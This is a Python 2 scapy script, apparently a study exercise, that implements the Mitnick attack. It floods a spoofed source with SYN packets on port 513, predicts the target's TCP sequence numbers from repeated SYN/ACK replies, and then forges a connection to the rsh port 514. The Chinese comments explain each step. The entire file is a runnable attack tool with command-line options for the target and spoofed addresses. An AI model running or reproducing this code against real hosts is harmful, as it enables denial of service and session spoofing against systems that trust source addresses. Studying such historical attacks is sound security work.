#!/usr/bin/python
#coding=utf-8
import optparse
from scapy.all import *

def synFlood(src, tgt):
    # TCP源端口不断自增一，而目标端口513不变
    for sport in range(1024, 65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)

def calTSN(tgt):
    seqNum = 0
    preNum = 0
    diffSeq = 0
    # 重复4次操作
    for x in range(1,5):
        # 若不是第一次发送SYN包，则设置前一个序列号值为上一次SYN/ACK包的序列号值
        # 逻辑出现问题
        # if preNum != 0:
        if seqNum != 0:
            preNum = seqNum
        # 构造并发送TCP SYN包
        pkt = IP(dst=tgt) / TCP()
        ans = sr1(pkt, verbose=0)
        # 读取SYN/ACK包的TCP序列号
        seqNum = ans.getlayer(TCP).seq
        if preNum != 0:
            diffSeq = seqNum - preNum
            print "[*] preNum: %d  seqNum: %d" % (preNum, seqNum)
            print "[+] TCP Seq Difference: " + str(diffSeq)
            print
    return seqNum + diffSeq

# 伪造TCP连接
def spoofConn(src, tgt, ack):
    # 发送TCP SYN包
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514)
    synPkt = IPlayer / TCPlayer
    send(synPkt)

    # 发送TCP ACK包
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    ackPkt = IPlayer / TCPlayer
    send(ackPkt)

def main():
    parser = optparse.OptionParser('[*]Usage: python mitnickAttack.py -s <src for SYN Flood> -S <src for spoofed connection> -t <target address>')
    parser.add_option('-s', dest='synSpoof', type='string', help='specifc src for SYN Flood')
    parser.add_option('-S', dest='srcSpoof', type='string', help='specify src for spoofed connection')
    parser.add_option('-t', dest='tgt', type='string', help='specify target address')
    (options, args) = parser.parse_args()
    if options.synSpoof == None or options.srcSpoof == None or options.tgt == None:
        print parser.usage
        exit(0)
    else:
        synSpoof = options.synSpoof
        srcSpoof = options.srcSpoof
        tgt = options.tgt

    print '[+] Starting SYN Flood to suppress remote server.'
    synFlood(synSpoof, srcSpoof)
    print '[+] Calculating correct TCP Sequence Number.'
    seqNum = calTSN(tgt) + 1
    print '[+] Spoofing Connection.'
    spoofConn(srcSpoof, tgt, seqNum)
    print '[+] Done.'

if __name__ == '__main__':
    main()

